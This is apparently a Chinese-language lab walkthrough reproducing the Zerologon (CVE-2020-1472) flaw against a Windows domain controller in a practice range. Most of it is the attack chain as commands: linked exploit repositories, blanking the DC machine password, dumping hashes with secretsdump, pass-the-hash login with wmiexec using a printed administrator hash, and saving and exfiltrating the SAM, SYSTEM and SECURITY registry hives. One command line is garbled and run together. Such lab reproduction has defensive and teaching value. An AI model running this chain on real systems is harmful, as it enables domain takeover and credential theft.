### 简介：

Netlogon使用的AES认证算法中的vi向量默认为0，导致攻击者可以绕过认证，同时其设置域控密码的远程接口也使用了该函数，导致可以将域控中保存在AD中的管理员password设置为空

### 环境搭建：

环境搭建的时候个人比较懒，直接使用的红日的第一套靶场用来复现，红日靶场的链接：

http://vulnstack.qiyuanxuetang.net/vuln/

密码默认为`hongrisec@2019`大家可以自行修改密码，关闭防火墙。

### 复现环境：

DC: Windows Server 2008  

IP : 192.168.52.138

  

攻击机：192.168.52.100

### 漏洞复现：

下载poc：https://github.com/SecuraBV/CVE-2020-1472 使用poc检查漏洞

```
python3 zerologon\_tester.py DC\_主机 DC\_IP
```

![](../Images/8ad3cc2ec6c7f049e2676eb5daf9fa02.png)

按照网上的文章复现使用exp:https://github.com/dirkjanm/CVE-2020-1472，如果出现以下情况，需要更新impacket。

![](../Images/17f102df7eb2547bcdb5bf13b5a0cdfe.png)

```
git clone https://github.com/CoreSecurity/impacket.git
cd impacket
python setup.py install
```

安装完成之后再执行，第一步操作是将域控的密码置空。

![](../Images/f171cfc3faad0cdeaac4a7b9c37b4424.png)

第二步、dump密码的时候一直报错，于是询问其他师傅，师傅给了我一个项目地址：https://github.com/mstxq17/cve-2020-1472。

```
py -3 secretsdump.py -no-pass ./owa$@192.168.52.138
```

![](../Images/75db9db5538f176f94dc71b2e5f96411.png)

第三步、使用wmiexec连接。

```
wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:81be2f80d568100549beac645d6a7141 ./administrator@192.168.52.138
```

![](../Images/6b2a5d13b3eca6692a24cfcb61b2d431.png)

```
reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.saveget system.saveget sam.saveget security.savedel system.savedel sam.savedel security.save
```

![](../Images/be12b9fce126925755d5bc8166629ec9.png)

```
Py -3 secretsdump.py -sam sam.save -system system.save -security security.save local
```

![](../Images/7514ea3238e56148545c03bf396e9d10.png)

```

```
